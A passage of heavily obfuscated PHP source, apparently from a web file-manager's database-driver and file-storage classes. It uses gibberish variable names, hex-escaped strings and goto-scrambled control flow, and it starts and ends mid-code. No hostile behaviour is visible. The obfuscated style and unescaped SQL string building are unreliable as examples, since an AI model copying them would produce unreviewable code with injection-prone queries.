public function rollback() { if ($this->transTimes > 0) { $CÓèÀ‚æîŠ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$CÓèÀ‚æîŠ) { $this->error(); return !1; } } return !0; } private function getAll() { $FñÈ‘¢… = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($FñÈ‘¢…); return $FñÈ‘¢…; } public function getFields($Aì•˜ì•Éù) { goto e÷õËàì»š; e÷õËàì»š: $c¶–ÖÚƒ… =& $_SERVER[…ë˜õ]; $this->initConnect(!0); if (think_config($c¶–ÖÚƒ…[898])) { $fëƒ¥äŸ×ß = str_replace($c¶–ÖÚƒ…[899], $Aì•˜ì•Éù, think_config($c¶–ÖÚƒ…[898])); } else { switch ($this->dbType) { case $c¶–ÖÚƒ…[882]: case $c¶–ÖÚƒ…[900]: $fëƒ¥äŸ×ß = "\123\105\x4c\x45\103\x54\40\40\x20\143\157\x6c\165\155\x6e\x5f\156\141\155\145\x20\141\x73\x20\47\x4e\x61\x6d\145\47\54\40\x20\40\x64\x61\164\141\x5f\x74\x79\160\145\x20\x61\163\x20\x27\124\171\x70\145\x27\54\x20\40\x20\x63\x6f\x6c\165\x6d\156\137\144\145\x66\x61\x75\154\x74\40\x61\163\40\x27\104\x65\146\141\x75\x6c\164\x27\x2c\40\x20\x20\x69\x73\x5f\156\x75\x6c\x6c\x61\142\154\145\x20\x61\x73\40\x27\x4e\165\154\154\47\xa\11\11\x46\122\117\x4d\11\151\x6e\x66\157\x72\155\141\164\151\157\x6e\137\x73\143\150\145\155\141\56\164\x61\x62\154\145\x73\40\101\x53\x20\x74\12\x9\x9\112\117\111\x4e\x9\151\156\146\157\162\x6d\x61\164\151\157\156\137\163\x63\150\145\155\x61\x2e\x63\x6f\154\x75\155\156\x73\40\101\x53\x20\143\xa\x9\x9\117\116\40\40\x74\x2e\x74\141\x62\x6c\x65\x5f\x63\x61\164\141\154\x6f\x67\x20\75\x20\x63\56\x74\141\142\154\145\137\x63\141\x74\x61\154\x6f\147\xa\11\11\x41\x4e\x44\40\164\x2e\164\141\x62\x6c\145\x5f\x73\143\150\145\x6d\141\40\75\40\x63\x2e\164\x61\142\154\145\x5f\163\143\x68\x65\x6d\x61\12\x9\x9\101\x4e\104\40\164\x2e\x74\x61\142\154\145\x5f\x6e\x61\155\x65\x20\75\x20\x63\56\x74\141\142\x6c\145\137\156\141\155\x65\xa\11\11\127\x48\x45\122\105\40\x20\40\164\56\164\141\x62\154\x65\137\156\141\x6d\145\x20\75\40\x27{$Aì•˜ì•Éù}\47"; break; case $c¶–ÖÚƒ…[901]: $fëƒ¥äŸ×ß = $c¶–ÖÚƒ…[902] . $Aì•˜ì•Éù . $c¶–ÖÚƒ…[903]; break; case $c¶–ÖÚƒ…[883]: case $c¶–ÖÚƒ…[885]: $fëƒ¥äŸ×ß = $c¶–ÖÚƒ…[904] . $c¶–ÖÚƒ…[905] . $c¶–ÖÚƒ…[906] . strtoupper($Aì•˜ì•Éù) . $c¶–ÖÚƒ…[907] . strtoupper($Aì•˜ì•Éù) . $c¶–ÖÚƒ…[908]; break; case $c¶–ÖÚƒ…[909]: $fëƒ¥äŸ×ß = $c¶–ÖÚƒ…[910] . $Aì•˜ì•Éù . $c¶–ÖÚƒ…[911]; break; case $c¶–ÖÚƒ…[884]: break; case $c¶–ÖÚƒ…[912]: default: $fëƒ¥äŸ×ß = $c¶–ÖÚƒ…[913] . ($this->dbType == $c¶–ÖÚƒ…[912] ? "\140{$Aì•˜ì•Éù}\140" : $Aì•˜ì•Éù); } } goto Bàí‚õ²È¦; EÍİóš™Ü: return $AëƒŒóæƒ; goto BùºÌªˆ¡ì; Bàí‚õ²È¦: $A™ªÅ²Ü‘• = $this->query($fëƒ¥äŸ×ß); $AëƒŒóæƒ = array(); if ($A™ªÅ²Ü‘•) { foreach ($A™ªÅ²Ü‘• as $Eõ©—‰‚Àµ => $BÃ‘­¹âã) { $BÃ‘­¹âã = array_change_key_case($BÃ‘­¹âã); $BÃ‘­¹âã[$c¶–ÖÚƒ…[28]] = isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[28]]) ? $BÃ‘­¹âã[$c¶–ÖÚƒ…[28]] : $c¶–ÖÚƒ…[373]; $BÃ‘­¹âã[$c¶–ÖÚƒ…[29]] = isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[29]]) ? $BÃ‘­¹âã[$c¶–ÖÚƒ…[29]] : $c¶–ÖÚƒ…[373]; $eøâ¯À¤– = isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[269]]) ? $BÃ‘­¹âã[$c¶–ÖÚƒ…[269]] : $BÃ‘­¹âã[$c¶–ÖÚƒ…[28]]; $AëƒŒóæƒ[$eøâ¯À¤–] = array($c¶–ÖÚƒ…[28] => $eøâ¯À¤–, $c¶–ÖÚƒ…[29] => $BÃ‘­¹âã[$c¶–ÖÚƒ…[29]], $c¶–ÖÚƒ…[31] => (bool) (isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[102]]) && $BÃ‘­¹âã[$c¶–ÖÚƒ…[102]] === $c¶–ÖÚƒ…[33] || isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[31]]) && $BÃ‘­¹âã[$c¶–ÖÚƒ…[31]] === $c¶–ÖÚƒ…[33]), $c¶–ÖÚƒ…[34] => isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[34]]) ? $BÃ‘­¹âã[$c¶–ÖÚƒ…[34]] : (isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[53]]) ? $BÃ‘­¹âã[$c¶–ÖÚƒ…[53]] : $c¶–ÖÚƒ…[373]), $c¶–ÖÚƒ…[36] => isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[92]]) ? strtolower($BÃ‘­¹âã[$c¶–ÖÚƒ…[92]]) == $c¶–ÖÚƒ…[38] : (isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[54]]) ? $BÃ‘­¹âã[$c¶–ÖÚƒ…[54]] : !1), $c¶–ÖÚƒ…[39] => isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[914]]) ? strtolower($BÃ‘­¹âã[$c¶–ÖÚƒ…[914]]) == $c¶–ÖÚƒ…[41] : (isset($BÃ‘­¹âã[$c¶–ÖÚƒ…[92]]) ? $BÃ‘­¹âã[$c¶–ÖÚƒ…[92]] : !1)); } } goto EÍİóš™Ü; BùºÌªˆ¡ì: } public function getTables($Dğ­Å¥˜Å = '') { $BáÖÃ•‘¥ =& $_SERVER[…ë˜õ]; if (think_config($BáÖÃ•‘¥[915])) { $f¢‡†¬© = str_replace($BáÖÃ•‘¥[916], $Dğ­Å¥˜Å, think_config($BáÖÃ•‘¥[915])); } else { switch ($this->dbType) { case $BáÖÃ•‘¥[883]: case $BáÖÃ•‘¥[885]: $f¢‡†¬© = $BáÖÃ•‘¥[917]; break; case $BáÖÃ•‘¥[882]: case $BáÖÃ•‘¥[900]: $f¢‡†¬© = $BáÖÃ•‘¥[918]; break; case $BáÖÃ•‘¥[909]: $f¢‡†¬© = $BáÖÃ•‘¥[919]; break; case $BáÖÃ•‘¥[884]: think_exception(think_lang($BáÖÃ•‘¥[920]) . $BáÖÃ•‘¥[921]); break; case $BáÖÃ•‘¥[901]: $f¢‡†¬© = $BáÖÃ•‘¥[42] . $BáÖÃ•‘¥[43] . $BáÖÃ•‘¥[44]; break; case $BáÖÃ•‘¥[912]: default: if (!empty($Dğ­Å¥˜Å)) { $f¢‡†¬© = $BáÖÃ•‘¥[865] . $Dğ­Å¥˜Å . $BáÖÃ•‘¥[866]; } else { $f¢‡†¬© = $BáÖÃ•‘¥[867]; } } } $e¢†¼ÚåÓï = $this->query($f¢‡†¬©); $eŒó¯Šø¿· = array(); foreach ($e¢†¼ÚåÓï as $BËİ…·ùÕÎ => $bñ‘×œÆË©) { $eŒó¯Šø¿·[$BËİ…·ùÕÎ] = current($bñ‘×œÆË©); } return $eŒó¯Šø¿·; } protected function parseLimit($b†ÌÓåäìô) { $BÇáÅñÛİ =& $_SERVER[…ë˜õ]; $BÚ¦ÌÌÏ»Š = $BÇáÅñÛİ[33]; if (!empty($b†ÌÓåäìô)) { switch ($this->dbType) { case $BÇáÅñÛİ[909]: case $BÇáÅñÛİ[901]: $b†ÌÓåäìô = explode($BÇáÅñÛİ[47], $b†ÌÓåäìô); if (count($b†ÌÓåäìô) > 1) { $BÚ¦ÌÌÏ»Š .= $BÇáÅñÛİ[48] . $b†ÌÓåäìô[1] . $BÇáÅñÛİ[49] . $b†ÌÓåäìô[0] . $BÇáÅñÛİ[50]; } else { $BÚ¦ÌÌÏ»Š .= $BÇáÅñÛİ[48] . $b†ÌÓåäìô[0] . $BÇáÅñÛİ[50]; } break; case $BÇáÅñÛİ[882]: case $BÇáÅñÛİ[900]: break; case $BÇáÅñÛİ[884]: break; case $BÇáÅñÛİ[883]: case $BÇáÅñÛİ[885]: break; case $BÇáÅñÛİ[912]: default: $BÚ¦ÌÌÏ»Š .= $BÇáÅñÛİ[48] . $b†ÌÓåäìô . $BÇáÅñÛİ[50]; } } return $BÚ¦ÌÌÏ»Š; } public function parseKey(&$Fö¹Á–äŠğ, $EÀ—‡¤¯„œ = true) { $b“Ù˜ƒ¯Õ½ =& $_SERVER[…ë˜õ]; if ($EÀ—‡¤¯„œ) { $Fö¹Á–äŠğ = $this->parseKeyCheck($Fö¹Á–äŠğ); } if ($this->dbType == $b“Ù˜ƒ¯Õ½[912]) { if ($Fö¹Á–äŠğ != $b“Ù˜ƒ¯Õ½[181] && !preg_match($b“Ù˜ƒ¯Õ½[877], $Fö¹Á–äŠğ)) { $Fö¹Á–äŠğ = $b“Ù˜ƒ¯Õ½[380] . trim($Fö¹Á–äŠğ, $b“Ù˜ƒ¯Õ½[380]) . $b“Ù˜ƒ¯Õ½[380]; } return $Fö¹Á–äŠğ; } else { return parent::parseKey($Fö¹Á–äŠğ, $EÀ—‡¤¯„œ); } } public function close() { $this->_linkID = null; } public function error() { $CÒôÂæ¯³ =& $_SERVER[…ë˜õ]; if ($this->PDOStatement) { $CÀù®°–ïà = $this->PDOStatement->errorInfo(); $this->error = $CÀù®°–ïà[1] . $CÒôÂæ¯³[4] . $CÀù®°–ïà[2]; } else { $this->error = $CÒôÂæ¯³[33]; } if ($CÒôÂæ¯³[33] != $this->queryStr) { $this->error .= LNG($CÒôÂæ¯³[45]) . $this->queryStr; } think_trace($this->error, $CÒôÂæ¯³[33], $CÒôÂæ¯³[46]); return $this->error; } public function escapeString($c¼¬¬º—Üã) { $F•Ñ¹Ü‚‚Ú =& $_SERVER[…ë˜õ]; switch ($this->dbType) { case $F•Ñ¹Ü‚‚Ú[909]: case $F•Ñ¹Ü‚‚Ú[882]: case $F•Ñ¹Ü‚‚Ú[900]: case $F•Ñ¹Ü‚‚Ú[912]: return addslashes($c¼¬¬º—Üã); case $F•Ñ¹Ü‚‚Ú[884]: case $F•Ñ¹Ü‚‚Ú[901]: case $F•Ñ¹Ü‚‚Ú[883]: case $F•Ñ¹Ü‚‚Ú[885]: return str_ireplace($F•Ñ¹Ü‚‚Ú[55], $F•Ñ¹Ü‚‚Ú[56], $c¼¬¬º—Üã); } } protected function parseValue($f—Ì Ö) { $CùäÍ¤šÏÒ =& $_SERVER[…ë˜õ]; if (is_string($f—Ì Ö)) { $eÀ¾´ò÷³ = strpos($f—Ì Ö, $CùäÍ¤šÏÒ[4]) === 0 && in_array($f—Ì Ö, array_keys($this->bind)); $f—Ì Ö = $eÀ¾´ò÷³ ? $this->escapeString($f—Ì Ö) : $CùäÍ¤šÏÒ[922] . $this->escapeString($f—Ì Ö) . $CùäÍ¤šÏÒ[922]; } elseif (isset($f—Ì Ö[0]) && is_string($f—Ì Ö[0]) && strtolower($f—Ì Ö[0]) == $CùäÍ¤šÏÒ[293]) { $f—Ì Ö = $this->escapeString($f—Ì Ö[1]); } elseif (is_array($f—Ì Ö)) { $f—Ì Ö = array_map(array($this, $CùäÍ¤šÏÒ[923]), $f—Ì Ö); } elseif (is_bool($f—Ì Ö)) { $f—Ì Ö = $f—Ì Ö ? $CùäÍ¤šÏÒ[86] : $CùäÍ¤šÏÒ[491]; } elseif (is_null($f—Ì Ö)) { $f—Ì Ö = $CùäÍ¤šÏÒ[102]; } return $f—Ì Ö; } public function getLastInsertId() { $AõåÄØƒ¾’ =& $_SERVER[…ë˜õ]; switch ($this->dbType) { case $AõåÄØƒ¾’[909]: case $AõåÄØƒ¾’[901]: case $AõåÄØƒ¾’[882]: case $AõåÄØƒ¾’[900]: case $AõåÄØƒ¾’[884]: case $AõåÄØƒ¾’[912]: return $this->_linkID->lastInsertId(); case $AõåÄØƒ¾’[883]: case $AõåÄØƒ¾’[885]: $Fàˆù‡‰» = $this->table; $CÛ³†ÅÏ‰ö = $this->query("\123\105\x4c\105\103\124\40{$Fàˆù‡‰»}\x2e\x63\165\x72\162\x76\x61\x6c\x20\143\165\162\162\x76\141\x6c\40\106\122\117\115\40\x64\x75\141\154"); return $CÛ³†ÅÏ‰ö ? $CÛ³†ÅÏ‰ö[0][$AõåÄØƒ¾’[924]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($E‚İœ¬—‰¨) { $D‘²È³Õñ² =& $_SERVER[…ë˜õ]; if (!CacheLock::fileLock($D‘²È³Õñ²[9])) { return !1; } $a°ÄâÚ‘Á = parent::query($E‚İœ¬—‰¨); CacheLock::fileUnLock($D‘²È³Õñ²[9]); return $a°ÄâÚ‘Á; } public function execute($Cá›‚İº¿Ï) { $b÷†Øƒ˜æ¥ =& $_SERVER[…ë˜õ]; if (!CacheLock::fileLock($b÷†Øƒ˜æ¥[9])) { return !1; } $CŞ¦ïŠ¯‘‰ = parent::execute($Cá›‚İº¿Ï); CacheLock::fileUnLock($b÷†Øƒ˜æ¥[9]); return $CŞ¦ïŠ¯‘‰; } } class DbSqlite3 extends DbSqlite3Base { public function query($d¤–ÚÈò±Ó) { $Cêç¾‹Ëˆ =& $_SERVER[…ë˜õ]; if (!CacheLock::fileLock($Cêç¾‹Ëˆ[9])) { return !1; } $FÖËŸªÊÙ = parent::query($d¤–ÚÈò±Ó); CacheLock::fileUnLock($Cêç¾‹Ëˆ[9]); return $FÖËŸªÊÙ; } public function execute($BÆœ‘â¹Å”) { $DŞÏ¢İâœ =& $_SERVER[…ë˜õ]; if (!CacheLock::fileLock($DŞÏ¢İâœ[9])) { return !1; } $FÔ‹Ò¹àÌ« = parent::execute($BÆœ‘â¹Å”); CacheLock::fileUnLock($DŞÏ¢İâœ[9]); return $FÔ‹Ò¹àÌ«; } } goto D² ›¡˜á; D·Àå‡™™š: class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\x6c\x65"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\x6d\x65" => "\151\157\x5f\x66\x69\x6c\x65\137\155\x65\x74\141", "\x6d\x65\164\x61\106\x69\x65\x6c\144" => "\146\151\154\x65\x49\x44"); public function fileInfo($aÒ¿ÆàÌ‹) { $d­²‡®±Í =& $_SERVER[…ë˜õ]; static $F–ÌÕÖóö = array(); if (!isset($F–ÌÕÖóö[$aÒ¿ÆàÌ‹])) { $EŞ¶¸°ç™Ó = $d­²‡®±Í[1738]; $D±–Ş¸Êé = Model($d­²‡®±Í[444])->field($EŞ¶¸°ç™Ó)->where(array($d­²‡®±Í[442] => $aÒ¿ÆàÌ‹))->find(); $F–ÌÕÖóö[$aÒ¿ÆàÌ‹] = $D±–Ş¸Êé; } return $F–ÌÕÖóö[$aÒ¿ÆàÌ‹]; } public function addFileByContent($AĞ±¾Á»’  = '', $BªÀòÆ—„¦ = '') { goto D¦¬éŒÕÊ¨; f‡á“Úô›õ: if (file_exists($C°îùÚà‡)) { @unlink($C°îùÚà‡); } return $dÑøï´è«³; goto FÇèÑ›Óœ; BËÒË“÷Ş: $C°îùÚà‡ = $EÑè†ÃĞ„ . $b§•ï‹š¶ß[1740] . rand_string(16); file_put_contents($C°îùÚà‡, $AĞ±¾Á»’ ); $dÑøï´è«³ = $this->addFile($C°îùÚà‡, $BªÀòÆ—„¦, !0); goto f‡á“Úô›õ; D¦¬éŒÕÊ¨: $b§•ï‹š¶ß =& $_SERVER[…ë˜õ]; $EÑè†ÃĞ„ = TEMP_PATH . $b§•ï‹š¶ß[1739]; if (!is_dir($EÑè†ÃĞ„)) { mk_dir($EÑè†ÃĞ„); } goto BËÒË“÷Ş; FÇèÑ›Óœ: } public function createFileName($AÔùˆ ™˜¢, $fË· Õ÷ = false, $c½£½‰çÆÅ = false) { goto BŸëÌòç¢å; B›å¬¼È¨“: if (!$FšÈ«¤Å && !Cache::get($CÁêê’¢ê)) { $FšÈ«¤Å = !0; $FÄÚÑÑÂäŸ = IO::mkdir($Cæ…ÁÀ“·¨); if (!IO::exist($FÄÚÑÑÂäŸ . $CèØ‘ØÕ–[1742])) { IO::mkfile($FÄÚÑÑÂäŸ . $CèØ‘ØÕ–[1742]); } Cache::set($CÁêê’¢ê, 1, 3600 * 2); } return $e©¯ğº¼¹; goto Cãùİ–ÓÀ‘; BŸëÌòç¢å: $CèØ‘ØÕ– =& $_SERVER[…ë˜õ]; $b÷¸µĞ¯Ã = IO::init($CèØ‘ØÕ–[8]); $e©¯ğº¼¹ = $this->makeFilePath($AÔùˆ ™˜¢, $b÷¸µĞ¯Ã, $fË· Õ÷, $c½£½‰çÆÅ); goto eô§Î¿­’; eô§Î¿­’: $Cæ…ÁÀ“·¨ = $b÷¸µĞ¯Ã->pathFather($e©¯ğº¼¹); static $FšÈ«¤Å = false; $CÁêê’¢ê = $CèØ‘ØÕ–[1741] . md5($Cæ…ÁÀ“·¨); goto B›å¬¼È¨“; Cãùİ–ÓÀ‘: } public function makeFilePath($Fßº­ù§†Õ, $dîÌö‹ã³, $A¥ŒğÊ²”“ = false, $C‘µßø¢º¢ = false) { goto c¡õ¹£òŞæ; c¡õ¹£òŞæ: $Fİ¶È§ïõ =& $_SERVER[…ë˜õ]; $f´í­™ßÀà = Model($Fİ¶È§ïõ[1129])->get($Fİ¶È§ïõ[1743]); $d“†îÇ´ï = KodIO::defaultIO() . date($Fİ¶È§ïõ[1744]); goto eÑê¨àéÊ; f†™•ò¸¨¬: if (!$Fßº­ù§†Õ) { $f´í­™ßÀà = $Fİ¶È§ïõ[1745]; } switch ($f´í­™ßÀà) { case $Fİ¶È§ïõ[1746]: $eÛ¥éÛòï† = $eÛ¥éÛòï† . $Fİ¶È§ïõ[94] . $dîÌö‹ã³->ext($Fßº­ù§†Õ); if ($aí™À¸ì¨– == $Fİ¶È§ïõ[1684]) { $eÛ¥éÛòï† .= $Fİ¶È§ïõ[1432]; } break; case $Fİ¶È§ïõ[1747]: goto eßƒâ‘“©; eßƒâ‘“©: $d‰Æ•Õô¾Â = Model($Fİ¶È§ïõ[1129])->get($Fİ¶È§ïõ[1428]); $aÚ„‡ÚáÁŞ = substr(md5($Fİ¶È§ïõ[1748] . $d‰Æ•Õô¾Â . date($Fİ¶È§ïõ[729])), 0, 8); $BßÒä¡Á•« = KodIO::defaultDriver(); goto b½•Ü”…ù; BôÃ§¸¡ƒ¯: CacheLock::lock($B…ö¹Îï¸‚); $eÛ¥éÛòï† = $d“†îÇ´ï . $Fßº­ù§†Õ; if (IO::exist($d“†îÇ´ï . $Fßº­ù§†Õ)) { $eŒŸŒˆˆÒ = substr($Fßº­ù§†Õ, 0, strlen($Fßº­ù§†Õ) - strlen($aí™À¸ì¨–)); $DÕê’Æí = $C‘µßø¢º¢ ? substr($C‘µßø¢º¢, 0, 5) : ($A¥ŒğÊ²”“ ? substr($A¥ŒğÊ²”“, 0, 5) : rand_string(5)); $eÛ¥éÛòï† = $d“†îÇ´ï . $eŒŸŒˆˆÒ . $DÕê’Æí . $Fİ¶È§ïõ[94] . $aí™À¸ì¨–; } goto d¬ÑãŞø‚¸; d¬ÑãŞø‚¸: if (IO::isTypeObject($eÛ¥éÛòï†) && !IO::isUploadServer($eÛ¥éÛòï†)) { $cõŒº‹ÉŒÏ = IO::setContent($eÛ¥éÛòï†, $Fİ¶È§ïõ[33]); if (!$cõŒº‹ÉŒÏ) { show_json($Fİ¶È§ïõ[1751], !1); } } CacheLock::unlock($B…ö¹Îï¸‚); break; goto fËµ‰Ò÷£ƒ; b½•Ü”…ù: $d“†îÇ´ï = $Fİ¶È§ïõ[1127] . $BßÒä¡Á•«[$Fİ¶È§ïõ[388]] . $Fİ¶È§ïõ[396] . date($Fİ¶È§ïõ[1749]) . $aÚ„‡ÚáÁŞ . $Fİ¶È§ïõ[8]; if ($aí™À¸ì¨– == $Fİ¶È§ïõ[1684]) { $Fßº­ù§†Õ .= $Fİ¶È§ïõ[1432]; } $B…ö¹Îï¸‚ = $Fİ¶È§ïõ[1750] . $d“†îÇ´ï . $Fßº­ù§†Õ; goto BôÃ§¸¡ƒ¯; fËµ‰Ò÷£ƒ: case $Fİ¶È§ïõ[1745]: break; default: break; } return $eÛ¥éÛòï†; goto f–¦¹šÓ’Ë; eÑê¨àéÊ: $eÛ¥éÛòï† = $d“†îÇ´ï . rand_string(5) . short_id(100); $Fßº­ù§†Õ = str_replace($Fİ¶È§ïõ[8], $Fİ¶È§ïõ[70], KodIO::clear($Fßº­ù§†Õ)); $aí™À¸ì¨– = $dîÌö‹ã³->ext($Fßº­ù§†Õ); goto f†™•ò¸¨¬; f–¦¹šÓ’Ë: } public function addFileByRemote($ešµê´½äˆ, $fæáôô¼·, $B£„¹¨ÔöÎ = array()) { goto c´Ò„‹£§; c´Ò„‹£§: $F†™ËŒ½ï =& $_SERVER[…ë˜õ]; if (!IO::exist($ešµê´½äˆ)) { return !1; } $BÅÇÊØ¹¡õ = $B£„¹¨ÔöÎ[$F†™ËŒ½ï[169]] ? $B£„¹¨ÔöÎ[$F†™ËŒ½ï[169]] : $F†™ËŒ½ï[33]; goto B¤ó˜£º‰Ó; B¤ó˜£º‰Ó: $f®¥‘•®Î = IO::hashMd5($ešµê´½äˆ, $BÅÇÊØ¹¡õ); $bíšì©°„ = KodIO::defaultDriver(); $B«ÈêÛÖñ‹ = array($F†™ËŒ½ï[543] => IO::size($ešµê´½äˆ), $F†™ËŒ½ï[1752] => 1, $F†™ËŒ½ï[407] => $fæáôô¼·, $F†™ËŒ½ï[781] => $bíšì©°„[$F†™ËŒ½ï[388]], $F†™ËŒ½ï[408] => $ešµê´½äˆ, $F†™ËŒ½ï[1753] => $B£„¹¨ÔöÎ[$F†™ËŒ½ï[170]] ? $B£„¹¨ÔöÎ[$F†™ËŒ½ï[170]] : IO::hashSimple($ešµê´½äˆ), $F†™ËŒ½ï[1754] => $f®¥‘•®Î ? $f®¥‘•®Î : $BÅÇÊØ¹¡õ); goto Fœ‡ù¼°; Fœ‡ù¼°: if ($D­Ò‰·À— = $this->addFileCheckExist($B«ÈêÛÖñ‹[$F†™ËŒ½ï[170]], $B«ÈêÛÖñ‹[$F†™ËŒ½ï[169]], $B«ÈêÛÖñ‹[$F†™ËŒ½ï[77]])) { return $D­Ò‰·À—; } return $this->addFileData($B«ÈêÛÖñ‹); goto fÂç‹õ¿ğ; fÂç‹õ¿ğ: } private function addFileData($aš‡’µÌ³ª) { $C„®ŸÊ–§Ú =& $_SERVER[…ë˜õ]; if (!$aš‡’µÌ³ª) { return !1; } $aš‡’µÌ³ª[$C„®ŸÊ–§Ú[77]] = intval($aš‡’µÌ³ª[$C„®ŸÊ–§Ú[77]]); if (!$aš‡’µÌ³ª[$C„®ŸÊ–§Ú[77]] && strlen($aš‡’µÌ³ª[$C„®ŸÊ–§Ú[170]]) > 32) { $aš‡’µÌ³ª[$C„®ŸÊ–§Ú[77]] = intval(substr($aš‡’µÌ³ª[$C„®ŸÊ–§Ú[170]], 32)); } $CÉã©¾½ùÓ = $this->add($aš‡’µÌ³ª); return $this->find($CÉã©¾½ùÓ); } public function addFile($aô„÷’Ñá , $F„Ñ‚Ù›–, $dœè‘„ïß = false) { goto a´Ş‚Îë×è; a´Ş‚Îë×è: $Bâá©¶Èì = IO::hashSimple($aô„÷’Ñá ); $DÄœåì„ê = IO::hashMd5($aô„÷’Ñá ); $DœòÜ±Ë³… = IO::size($aô„÷’Ñá ); goto EÁ ïÊ°…„; a•î¢¿ŒÙˆ: $bŠ™¥½ôÙ = $this->addFileMake($aô„÷’Ñá , $DœòÜ±Ë³…, $Bâá©¶Èì, $DÄœåì„ê, $F„Ñ‚Ù›–, $dœè‘„ïß); $aå—¸­ÊĞ = $this->addFileData($bŠ™¥½ôÙ); CacheLock::unlock($aîƒËáƒ); goto F¿¶Ïàæ‹÷; EÁ ïÊ°…„: $aîƒËáƒ = $_SERVER[…ë˜õ][1755] . $DÄœåì„ê; CacheLock::lock($aîƒËáƒ); if ($B¾Óµ—¢¿ = $this->addFileCheckExist($Bâá©¶Èì, $DÄœåì„ê, $DœòÜ±Ë³…)) { CacheLock::unlock($aîƒËáƒ); return $B¾Óµ—¢¿; } goto a•î¢¿ŒÙˆ; F¿¶Ïàæ‹÷: return $aå—¸­ÊĞ; goto Fœø±„³ÜÕ; Fœø±„³ÜÕ: } public function addFileMake($e“˜ÈÜ†×Ÿ, $fé¿á½˜–ù, $B–¶ÜÇƒ‰, $B£ÌšÓÅÀ, $dõÂ¼õ¶‚², $eŸä½æÊ²) { goto e×ÚëùÉ; e×ÚëùÉ: $eÓ÷Ğ÷‚ßé =& $_SERVER[…ë˜õ]; $cŠƒê¯ƒ = $this->createFileName($dõÂ¼õ¶‚², $B–¶ÜÇƒ‰, $B£ÌšÓÅÀ); $a¢„¦òŠ× = get_path_father($cŠƒê¯ƒ); goto E‡ÔêÍÎ´; EÓßêíˆ¯…: $f¢ÊÎŒå´Ó = KodIO::defaultDriver(); $Cš†¥ºñÈƒ = array($eÓ÷Ğ÷‚ßé[543] => $fé¿á½˜–ù, $eÓ÷Ğ÷‚ßé[1752] => 1, $eÓ÷Ğ÷‚ßé[407] => $dõÂ¼õ¶‚², $eÓ÷Ğ÷‚ßé[781] => $f¢ÊÎŒå´Ó[$eÓ÷Ğ÷‚ßé[388]], $eÓ÷Ğ÷‚ßé[408] => $cŠƒê¯ƒ, $eÓ÷Ğ÷‚ßé[1753] => $B–¶ÜÇƒ‰, $eÓ÷Ğ÷‚ßé[1754] => $B£ÌšÓÅÀ); return $Cš†¥ºñÈƒ; goto Aİ‡ãåöë¥; E‡ÔêÍÎ´: $dÛ»¹‹Ê·í = get_path_this($cŠƒê¯ƒ); if ($eŸä½æÊ²) { $Aö¹ÙÖõ‰± = IO::move($e“˜ÈÜ†×Ÿ, $a¢„¦òŠ×, !1, $dÛ»¹‹Ê·í); } else { $Aö¹ÙÖõ‰± = IO::copy($e“˜ÈÜ†×Ÿ, $a¢„¦òŠ×, !1, $dÛ»¹‹Ê·í); } if (!$Aö¹ÙÖõ‰±) { return !1; } goto EÓßêíˆ¯…; Aİ‡ãåöë¥: } public function addFileCheckExist($f­œâÛ‚É, $d¯ëŒÄÄ÷±, $A’¡ë¶›Äì) { $EÃ‚¶ÙŠÁ =& $_SERVER[…ë˜õ]; $eÁñ™òá® = $this->findByHash($f­œâÛ‚É, $d¯ëŒÄÄ÷±); if (!$eÁñ™òá®) { return !1; } $fŞÙøĞœÂù = array($EÃ‚¶ÙŠÁ[1752] => intval($eÁñ™òá®[$EÃ‚¶ÙŠÁ[1756]]) + 1, $EÃ‚¶ÙŠÁ[543] => $A’¡ë¶›Äì); $this->where(array($EÃ‚¶ÙŠÁ[442] => $eÁñ™òá®[$EÃ‚¶ÙŠÁ[441]]))->save($fŞÙøĞœÂù); return $eÁñ™òá®; } public function remove($a´­À‚ÚÆë) { $this->linkCountChange($a´­À‚ÚÆë, !1); $this->clearEmpty(); return !0; } public function linkAdd($FßÚğí‡¬) { $this->linkCountChange($FßÚğí‡¬, !0); } public function linkCountChange($Fƒ¾¸Íµ‘, $BŞİöèÒ«¢) { goto eË²Øùëğ; eË²Øùëğ: $dÁ«¾ºÈàî =& $_SERVER[…ë˜õ]; if (!$Fƒ¾¸Íµ‘) { return; } if (!is_array($Fƒ¾¸Íµ‘)) { $Fƒ¾¸Íµ‘ = array($Fƒ¾¸Íµ‘); } goto B¦‹‹°Á; B¦‹‹°Á: $CÁñ»ìŠÙ¥ = array(); foreach ($Fƒ¾¸Íµ‘ as $A‰‘©ªƒ…ˆ) { $aî‹Ÿ÷­«õ = $A‰‘©ªƒ…ˆ . $dÁ«¾ºÈàî[33]; if (!$CÁñ»ìŠÙ¥[$aî‹Ÿ÷­«õ]) { $CÁñ»ìŠÙ¥[$aî‹Ÿ÷­«õ] = 0; } $CÁñ»ìŠÙ¥[$aî‹Ÿ÷­«õ]++; } $F‘Âšà = array(); goto aù¦ÉãĞè¬; aù¦ÉãĞè¬: foreach ($CÁñ»ìŠÙ¥ as $A‰‘©ªƒ…ˆ => $fâì ÈÚ× ) { $aî‹Ÿ÷­«õ = $fâì ÈÚ×  . $dÁ«¾ºÈàî[33]; if (!$F‘Âšà[$aî‹Ÿ÷­«õ]) { $F‘Âšà[$aî‹Ÿ÷­«õ] = array(); } $F‘Âšà[$aî‹Ÿ÷­«õ][] = $A‰‘©ªƒ…ˆ; } foreach ($F‘Âšà as $fâì ÈÚ×  => $b×É¸­Æµ¯) { if (!$b×É¸­Æµ¯) { continue; } $fâì ÈÚ×  = $BŞİöèÒ«¢ ? $fâì ÈÚ×  : -intval($fâì ÈÚ× ); $cîØ©ƒŠ¸½ = array($dÁ«¾ºÈàî[441] => array($dÁ«¾ºÈàî[7], $b×É¸­Æµ¯)); if ($fâì ÈÚ×  < 0) { $cîØ©ƒŠ¸½[$dÁ«¾ºÈàî[1756]] = array($dÁ«¾ºÈàî[978], abs($fâì ÈÚ× )); } 